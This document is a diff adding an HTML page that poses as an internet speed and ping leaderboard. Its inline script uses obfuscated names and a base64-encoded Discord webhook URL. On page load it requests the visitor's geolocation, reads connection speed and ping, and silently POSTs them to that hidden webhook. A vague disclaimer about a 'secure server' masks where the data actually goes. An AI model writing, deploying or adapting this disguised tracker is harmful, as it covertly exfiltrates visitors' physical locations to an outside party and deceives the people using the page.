@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Leaderboard</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f4f4f4;
+            margin: 0;
+        }
+        header {
+            background-color: #333;
+            color: white;
+            padding: 20px;
+        }
+        table {
+            margin-top: 20px;
+            width: 80%;
+            max-width: 600px;
+            border-collapse: collapse;
+            margin: 0 auto;
+        }
+        table, th, td {
+            border: 1px solid #ddd;
+        }
+        th, td {
+            padding: 10px;
+            text-align: center;
+        }
+        th {
+            background-color: #333;
+            color: white;
+        }
+        .info {
+            margin: 20px;
+            padding: 10px;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        .info p {
+            font-size: 18px;
+            margin: 5px 0;
+        }
+        .disclaimer {
+            background-color: #ffeb3b;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 14px;
+            margin: 20px;
+        }
+        footer {
+            background-color: #333;
+            color: white;
+            padding: 10px;
+        }
+        /* Responsive Design */
+        @media (max-width: 600px) {
+            table {
+                width: 100%;
+            }
+            .info p {
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Leaderboard: Internet Speed and Ping</h1>
+    </header>
+
+    <div class="disclaimer">
+        <p><strong>Disclaimer:</strong> Your location, internet speed, and ping are being captured for performance analysis and are sent securely to our server.</p>
+    </div>
+
+    <div class="info">
+        <p><strong>Your Location:</strong> <span id="location">Loading...</span></p>
+        <p><strong>Internet Speed:</strong> <span id="internetSpeed">Loading...</span></p>
+        <p><strong>Ping:</strong> <span id="ping">Loading...</span></p>
+    </div>
+
+    <table id="leaderboard">
+        <thead>
+            <tr>
+                <th>Rank</th>
+                <th>Internet Speed (Mbps)</th>
+                <th>Ping (ms)</th>
+            </tr>
+        </thead>
+        <tbody></tbody>
+    </table>
+
+    <footer>
+        <p>&copy; 2025 Senaic12345</p>
+    </footer>
+
+    <script>
+        (function() {
+            var _0x5678="aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMzNTM0MTY1OTgyMjYyMDcyMy8xaG8yQ0ZRTHVnZTBvdU1XbER3UUtxWVlvVWNjZk1OQjdMbGZIVklsZk5LNkJKUWYxY3Zhb2RFdDkwdmw3QmlIZGRaZA=="; 
+            var _0x1234=atob(_0x5678);
+            var _0x9abc=function(){return _0x1234};
+
+            function _0x2345(){
+                const _0x5679=navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                return _0x5679?_0x5679.downlink:"Unavailable";
+            }
+
+            function _0x6789(){
+                const _0x567d=navigator.connection ? navigator.connection.rtt : "Unavailable";
+                return _0x567d;
+            }
+
+            function _0x678a(_0x234a, _0x567b, _0x789c){
+                alert("User Location\nLatitude: "+_0x234a+"\nLongitude: "+_0x567b+"\nInternet Speed: "+_0x789c.speed+" Mbps\nPing: "+_0x789c.ping+" ms");
+                const _0x3456 = {content: "User Information", embeds: [{title: "Location and Speed Data", fields: [{name: "Location", value: `Latitude: ${_0x234a}\nLongitude: ${_0x567b}`, inline: true}, {name: "Internet Speed", value: `${_0x789c.speed} Mbps`, inline: true}, {name: "Ping", value: `${_0x789c.ping} ms`, inline: true}]}]};
+                fetch(_0x9abc(), {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(_0x3456)}).catch(function(_0x7890){});
+            }
+
+            function updateLeaderboard(speed, ping){
+                let leaderboard = JSON.parse(localStorage.getItem('leaderboard') || "[]");
+                leaderboard.push({speed: speed, ping: ping});
+                leaderboard.sort((a, b) => b.speed - a.speed || a.ping - b.ping);
+                if (leaderboard.length > 5) leaderboard = leaderboard.slice(0, 5);  // Keep top 5 only
+                localStorage.setItem('leaderboard', JSON.stringify(leaderboard));
+                renderLeaderboard(leaderboard);
+            }
+
+            function renderLeaderboard(leaderboard){
+                const tbody = document.querySelector('#leaderboard tbody');
+                tbody.innerHTML = "";
+                leaderboard.forEach((entry, index) => {
+                    const tr = document.createElement('tr');
+                    tr.innerHTML = `<td>${index + 1}</td><td>${entry.speed} Mbps</td><td>${entry.ping} ms</td>`;
+                    tbody.appendChild(tr);
+                });
+            }
+
+            function getLocationAndSpeed(){
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(function(position) {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        document.getElementById("location").textContent = `${latitude}, ${longitude}`;
+                        const speed = _0x2345();
+                        const ping = _0x6789();
+                        document.getElementById("internetSpeed").textContent = `${speed} Mbps`;
+                        document.getElementById("ping").textContent = `${ping} ms`;
+
+                        _0x678a(latitude, longitude, {speed, ping});
+                        updateLeaderboard(speed, ping);
+                    }, function(error) {
+                        alert("Failed to get location. Using default location.");
+                        const defaultLatitude = 51.49;
+                        const defaultLongitude = -0.12;
+                        document.getElementById("location").textContent = `${defaultLatitude}, ${defaultLongitude}`;
+                        const speed = _0x2345();
+                        const ping = _0x6789();
+                        document.getElementById("internetSpeed").textContent = `${speed} Mbps`;
+                        document.getElementById("ping").textContent = `${ping} ms`;
+
+                        _0x678a(defaultLatitude, defaultLongitude, {speed, ping});
+                        updateLeaderboard(speed, ping);
+                    });
+                } else {
+                    alert("Geolocation is not supported by this browser.");
+                }
+            }
+
+            // Initialize leaderboard and load stored data
+            renderLeaderboard(JSON.parse(localStorage.getItem('leaderboard') || "[]"));
+            getLocationAndSpeed();
+        })();
+    </script>
+</body>
+</html>
